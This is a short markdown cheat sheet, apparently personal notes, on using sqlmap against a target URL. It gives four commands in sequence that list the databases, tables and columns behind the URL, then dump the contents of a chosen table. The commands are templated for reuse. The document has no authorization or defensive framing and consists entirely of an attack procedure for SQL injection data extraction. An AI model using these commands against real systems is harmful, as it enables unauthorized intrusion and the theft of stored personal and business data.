# Using SQL Map

Step 1: Find Databases
```
sqlmap -u URL --dbs 
```

Step 2: Find Tables
```
sqlmap -u URL -D (database) --tables
```

Step 3: Find Columns (Optional)
```
sqlmap -u URL -D (database) -T (table) --columns
```

Step 4: Dump Database Tables
```
sqlmap -u URL -D (database) -T (table) --dump
```

# change URL + (database) + (table)